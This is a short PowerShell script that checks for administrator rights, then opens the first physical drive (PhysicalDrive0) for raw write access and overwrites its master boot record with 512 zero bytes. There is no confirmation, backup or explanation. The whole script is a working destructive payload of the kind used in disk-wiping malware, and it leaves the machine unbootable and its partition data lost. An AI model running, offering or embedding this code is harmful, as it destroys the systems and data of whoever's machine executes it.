$MBR_SIZE = 512

# Check if the script is running with administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "This script requires administrative privileges. Please run the script as an administrator."
    Exit
}

try {
    $MasterBootRecord = [System.IO.File]::Open("\\.\PhysicalDrive0", 'Open', 'ReadWrite', 'None')

    $mbrData = New-Object byte[] $MBR_SIZE

    $MasterBootRecord.Write($mbrData, 0, $MBR_SIZE)
    Start-Sleep -Milliseconds 5000
    $MasterBootRecord.Close()
}
catch {
    # Handle the exception if needed
    Write-Host "An error occurred: $_"
    if ($MasterBootRecord -ne $null) {
        $MasterBootRecord.Close()
    }
}
